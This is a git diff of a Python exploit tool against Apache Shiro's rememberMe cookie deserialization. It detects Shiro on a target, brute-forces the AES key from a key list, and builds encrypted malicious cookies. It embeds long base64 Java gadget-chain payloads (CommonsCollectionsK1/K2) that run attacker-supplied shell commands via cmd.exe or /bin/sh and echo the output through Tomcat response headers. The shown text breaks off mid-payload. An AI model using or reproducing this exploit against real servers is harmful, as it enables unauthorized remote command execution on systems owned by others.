@@ -1,193 +1,315 @@
 #!/usr/bin/python3
 # -*- encoding: utf-8 -*-
-# @Time    :   2021/12/24 01:02:02
+# @Time    :   2021/12/28 16:12:42
 # @Author  :   4nth0ny @Friday_lab
 # @Version :   1.0
 
 import argparse
 import base64
 import os
+import random
 import re
 import subprocess
 import sys
 import uuid
 
 import requests
+from requests.api import head
 import urllib3
 from Crypto.Cipher import AES
+from faker import Factory
 
 urllib3.disable_warnings()
 
-PROXY={}
+class RandomString:
+    def __init__(self, min_length, max_length) -> None:
+        self.min_length = min_length
+        self.max_length = max_length
 
-YSOSERIAL_PATH = "ysoserial.jar"
+    def __call__(self):
+        random_length = random.randint(self.min_length, self.max_length)
+        random_str = ''
+        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz'
+        __length = len(base_str) - 1
+        for _ in range(random_length):
+            random_str += base_str[random.randint(0, __length)]
+        return random_str
 
-HEADER = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0", "Connection":"close"}
+class Payload:
+    check_data = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
+    file_body = base64.b64decode(check_data)
 
-CHECK_DATA = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
+    def __init__(self, key) -> str:
+        self.key = key
 
-def check_shiro():
-    request = requests.get(url, timeout=10, proxies=PROXY,
-                            verify=False, headers=HEADER, allow_redirects=False)
+    def gcm_encrypt(self, file_body=None):
+        if file_body == None:
+            file_body = self.file_body
+
+        iv                = os.urandom(16)
+        cipher            = AES.new(base64.b64decode(self.key), AES.MODE_GCM, iv)          
+        ciphertext, tag   = cipher.encrypt_and_digest(file_body)
+        ciphertext        = ciphertext + tag
+        base64_ciphertext = base64.b64encode(iv + ciphertext)
+        return base64_ciphertext
+
+    def cbc_encrypt(self, file_body=None):
+        if file_body == None:
+            file_body = self.file_body
+        bs                = AES.block_size
+        pad               = lambda s: s + ((bs - len(s) % bs) * chr(bs - len(s) % bs)).encode()
+        mode              = AES.MODE_CBC
+        iv                = uuid.uuid4().bytes
+        paded_file_body   = pad(file_body)
+        encryptor         = AES.new(base64.b64decode(self.key), mode, iv)
+        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(paded_file_body))
+        return base64_ciphertext
+
+class Command:
+    def __init__(self, mode, url, type, key, data, proxies, command, gadget):
+        self.mode    = mode
+        self.url     = url
+        self.type    = type
+        self.key     = key
+        self.data    = data
+        self.proxies = proxies
+        self.command = command
+        self.gadget  = gadget
+
+class CheckShiro(Command):
+    __random_str = RandomString(5, 10).__call__()
     
-    if int(str(request.status_code)[0:1]) in [4,5]:
-        print("[!] The target URL redirected or inaccessible!")
-        print("[!] The status code : {}".format(str(request.status_code)))
-        exit()
 
-    if data == None:
-        request = requests.get(url, cookies={'rememberMe': "xxxx"}, timeout=10, proxies=PROXY,
-                                verify=False, headers=HEADER, allow_redirects=False)
-        res_length = len(str(request.headers))
+    def __init__(self, mode, url, type, key, data, proxies, command, gadget):
+        super().__init__(mode, url, type, key, data, proxies, command, gadget)
 
-        if "rememberMe" in str(request.headers):
-            print("[*] Shiro framework exists for the target!")
-            return res_length
-        else:
-            print("[!] The Shiro framework may not exist for the target,maybe you can add '-d' argument and try again")
-            exit()
-    else:
-        request = requests.post(url, cookies={'rememberMe': "xxxx"}, timeout=10, proxies=PROXY,
-                                verify=False, headers=HEADER, allow_redirects=False,data=data)
-        res_length = len(str(request.headers))
-        if "rememberMe" in str(request.headers):
-            print("[*] Shiro framework exists for the target!")
-            return res_length
-        else:
-            print("[!] The Shiro framework may not exist for the target,maybe you can add '-d' argument and try again")
-            exit()
-
-def brute_key(url, type, key,data=None):
-    res_length = check_shiro()
-    try:
-        if key != None:
-            print("[*] Start checking the shiro key : {}".format(key))
-            if type == 'CBC':
-                payload = CBCEncrypt(key, base64.b64decode(CHECK_DATA)).decode()
-
-            if type == 'GCM':
-                payload = GCMEncrypt(key, base64.b64decode(CHECK_DATA)).decode()
-
-            if data != None:
-                r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
-                                    verify=False, headers=HEADER, allow_redirects=False,data=data)
-                rsp = len(str(r.headers))
-            else:
-                r = requests.get(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
-                                    verify=False, headers=HEADER,allow_redirects=False)
-                rsp = len(str(r.headers))
-
-            if res_length != rsp and r.status_code != 400:
-                print("[*] The correct key : {0}".format(key))
-                print("[*] The payload : {0}".format(payload))
+    def check_shiro(self):
+        __header = {"User-Agent":Factory.create().user_agent(), "Connection":"close"}
+        try:
+            request = requests.get(url=self.url, timeout=10, proxies=self.proxies,
+                                    verify=False, headers=__header, allow_redirects=False)
+            if request.raise_for_status() != None:
+                print("[!] {} redirected or inaccessible!".format(self.url))
+                print("[!] The status code : {}".format(str(request.status_code)))
+                alive_url = None
                 exit()
             else:
-                print("[!] The shiro key you specified is incorrect!")
-                return False
+                alive_url = self.url
+        except requests.exceptions.ConnectionError as e:
+            alive_url = None
+            print("[!] The target URL : {} can't connect!".format(self.url))
+            return None
+            # print("\r\n{}\r\n".format(e))
+
+        if alive_url == None:
+            pass
+        elif self.data:
+            request = requests.post(url=alive_url, cookies={'rememberMe': self.__random_str}, timeout=10, proxies=self.proxies,
+                                    verify=False, headers=__header, allow_redirects=False, data=self.data)
+            res_length = len(str(request.headers))
+            if "rememberMe" in str(request.headers):
+                print("[*] Shiro framework exists for {} !".format(self.url))
+                return res_length
+            else:
+                print(
+                    "[!] The Shiro framework may not exist for {},maybe you can remove '--data'/'-d' argument and try again".format(self.url))
         else:
-            print("[*] You didn't specify a shiro key. Start blasting mode!")
+            request = requests.get(url=alive_url, cookies={'rememberMe': self.__random_str}, timeout=10, proxies=self.proxies,
+                                    verify=False, headers=__header, allow_redirects=False)
+            res_length = len(str(request.headers))
+
+            if "rememberMe" in str(request.headers):
+                print("[*] Shiro framework exists for {} !".format(self.url))
+                return res_length
+            else:
+                print("[!] The Shiro framework may not exist for {},maybe you can add '--data'/'-d' argument and try again".format(self.url))
+
+class VerifyKey(Command):
+    def __init__(self, mode, url, type, key, data, proxies, command, gadget):
+        super().__init__(mode, url, type, key, data, proxies, command, gadget)
+
+    def crack(self):
+        __header = {"User-Agent":Factory.create().user_agent(), "Connection":"close"}
+        res_length = CheckShiro(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget).check_shiro()
+
+        if res_length == None:
+            return
+
+        if self.key == None:
             with open(os.path.join(sys.path[0], './lib/shiro_keys.txt'),'r') as fr:
                 keys = fr.read().splitlines()
+            for i in range(len(keys)):
+                print("[*] You didn't specify a shiro key. Start crack mode!")
+                if self.type == 'CBC':
+                    payload = Payload(keys[i]).cbc_encrypt().decode()
+                elif self.type == 'GCM':
+                    payload = Payload(keys[i]).gcm_encrypt().decode()
 
-            for i in range(0, len(keys)):
-                if type == 'CBC':
-                    payload = CBCEncrypt(keys[i],base64.b64decode(CHECK_DATA)).decode()
-
-                if type == 'GCM':
-                    payload = GCMEncrypt(keys[i],base64.b64decode(CHECK_DATA)).decode()
-
-                if data != None:
-                    r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
-                                        verify=False, headers=HEADER, allow_redirects=False,data=data)
+                if self.data == None:
+                    r = requests.get(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
+                                    verify=False, headers=__header, allow_redirects=False,data=data)
                     rsp = len(str(r.headers))
                 else:
-                    r = requests.get(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
-                                        verify=False, headers=HEADER,allow_redirects=False)
+                    r = requests.post(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
+                                    verify=False, headers=__header, allow_redirects=False,data=data)
                     rsp = len(str(r.headers))
 
                 if res_length != rsp and r.status_code != 400:
                     print("[*] The correct key : {0}".format(keys[i]))
                     print("[*] The payload : {0}".format(payload))
-                    exit()
+                    return keys[i]
+                else:
+                    print("[!] The shiro key of {} cracking failed!".format(self.url))
+                    return False
+
+        else:
+            print("[*] Start checking the shiro key : {}".format(self.key))
+            if self.type == 'CBC':
+                payload = Payload(self.key).cbc_encrypt().decode()
+            elif self.type == 'GCM':
+                payload = Payload(self.key).gcm_encrypt().decode()
+            if self.data == None:
+                r = requests.get(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
+                                    verify=False, headers=__header, allow_redirects=False,data=data)
+                rsp = len(str(r.headers))
             else:
-                return False
+                r = requests.post(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
+                                    verify=False, headers=__header, allow_redirects=False,data=data)
+                rsp = len(str(r.headers))
 
-    except Exception as e:
-        print(e)
-        return False
+        if res_length != rsp and r.status_code != 400:
+                print("[*] The correct key : {0}".format(self.key))
+                print("[*] The payload : {0}".format(payload))
+                return self.key
+        else:
+            print("[!] The shiro key you specified is incorrect!")
+            return False
 
-def GCMEncrypt(key,file_body):
-    iv                = os.urandom(16)
-    cipher            = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)          
-    ciphertext, tag   = cipher.encrypt_and_digest(file_body)
-    ciphertext        = ciphertext + tag
-    base64_ciphertext = base64.b64encode(iv + ciphertext)
-    return base64_ciphertext
+class Exploit(Command):
+    def __init__(self, mode, url, type, key, data, proxies, command, gadget):
+        super().__init__(mode, url, type, key, data, proxies, command, gadget)
 
-def CBCEncrypt(key,file_body):
-    BS                = AES.block_size
-    pad               = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
-    mode              = AES.MODE_CBC
-    iv                = uuid.uuid4().bytes
-    file_body         = pad(file_body)
-    encryptor         = AES.new(base64.b64decode(key), mode, iv)
-    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
-    return base64_ciphertext
+    def tomcat_echo(self):
+        key = VerifyKey(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget).crack()
 
+        tomcatEchoPayload={"CommonsCollectionsK1":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb29XRWN0SGptdmEHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb1dFY3RIam12YS5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAyQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEKAOAA4gEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDmCgDnAF4AIQACAOcAAAAAAAMACgAHAAgAAgA8AAAA3AAIAAUAAACxEgq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAEAAABoAGsANwABAEAAAAARAAL3AGsHADf9AEQHAAQHAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6nABktK7YARk2nABanAAA6BC22AEtOpwADLRIEpv/nLAGmAAy7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEwAWAEgAAQBAAAAAJQAG/QAKBwBWBwAMCP8AAgAEBwAEBwBcBwBWBwAMAAEHAEgJBQ0APQAAAAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkSa7gAbcAAbzoFAzYGFQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwIJGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHuGQcSfbgAbUwrwQB/mgAGpwHcKxKBuABtEoO4AG0ShbgAbUynAAs6CKcBw6cAACsSh7gAbcAAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2ADASlAO9AAy2ADUrA70ABLYALE0rtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJkABqcAWCy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXLLYAMBKgBb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQrtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEqJTtgAswABcTi0BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXEqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxKxU1kEErNTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZGQy3AL62AMK2AMi3AMsSzbYA0bYA1LYA2LgA2gQ2BC0BpQAKLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQAGpwAJhAoBp/5cFQSZAAanAAmEBgGn/d+xAAEAXwBwAHMAPwABAEAAAADdABn/ABoABwcAAgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEHAGEAAAL/ABEACAcAAgcABAAHAFwBBwBvAQcAYQAAUwcAPwT/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/AGMADAcAAgcABAcABAcAXAEHAG8BBwBhAAcAiQEHAAQAAAL7AFQuAvsATVEHAOUpCwQCDAf/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcACAcAAgAAAAEHAG8BBwBhAAD6AAUAPQAAAAQAAQA/AAEABQAAAAIABnB0AANhYmNzcgAUamF2YS51dGlsLlByb3BlcnRpZXM5EtB6cDY+mAIAAUwACGRlZmF1bHRzcQB+AAt4cgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHB3AQB4c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4AClsAC2lQYXJhbVR5cGVzcQB+AAl4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAB0AA5uZXdUcmFuc2Zvcm1lcnVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABdHg=",
+                        "CommonsCollectionsK2":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAhJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhaABVfdXNlU2VydmljZXNNZWNoYW5pc21MAAtfYXV4Q2xhc3Nlc3QAO0xjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9IYXNodGFibGU7WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAB/////wFwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9vZ2RMUVpRbjZlBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb29nZExRWlFuNmUuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HADYBABNqYXZhLm5pby5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEABENvZGUBAApFeGNlcHRpb25zAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAPgEADVN0YWNrTWFwVGFibGUBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAQwBECgAMAEUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAEcBAA1nZXRTdXBlcmNsYXNzDABJAC4KAAwASgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAIwBMCgBIAE0BACJqYXZhL2xhbmcvcmVmbGVjdC9BY2Nlc3NpYmxlT2JqZWN0BwBPAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAFEAUgoAUABTAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAFUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAVwBYCgBWAFkBABBqYXZhL2xhbmcvU3RyaW5nBwBbAQADKClWDAAjAF0KAAQAXgEAEGphdmEvbGFuZy9UaHJlYWQHAGABAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAGIAYwoAYQBkAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7DABmAGcKAGEAaAEAB3RocmVhZHMIAGoMAEEAQgoAAgBsAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAbgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAcABxCgBhAHIBAARleGVjCAB0AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAHYAdwoAXAB4AQAEaHR0cAgAegEABnRhcmdldAgAfAEAEmphdmEvbGFuZy9SdW5uYWJsZQcAfgEABnRoaXMkMAgAgAEAB2hhbmRsZXIIAIIBAAZnbG9iYWwIAIQBAApwcm9jZXNzb3JzCACGAQAOamF2YS91dGlsL0xpc3QHAIgBAARzaXplAQADKClJDACKAIsLAIkAjAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAVwCOCwCJAI8BAANyZXEIAJEBAAtnZXRSZXNwb25zZQgAkwEACWdldEhlYWRlcggAlQEACFRlc3RlY2hvCACXAQAHaXNFbXB0eQEAAygpWgwAmQCaCgBcAJsBAAlzZXRTdGF0dXMIAJ0BAAlhZGRIZWFkZXIIAJ8BAAdUZXN0Y21kCAChAQAHb3MubmFtZQgAowEAEGphdmEvbGFuZy9TeXN0ZW0HAKUBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACnAKgKAKYAqQEAC3RvTG93ZXJDYXNlDACrAHEKAFwArAEABndpbmRvdwgArgEAB2NtZC5leGUIALABAAIvYwgAsgEABy9iaW4vc2gIALQBAAItYwgAtgEAEWphdmEvdXRpbC9TY2FubmVyBwC4AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwC6AQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwAIwC8CgC7AL0BAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNz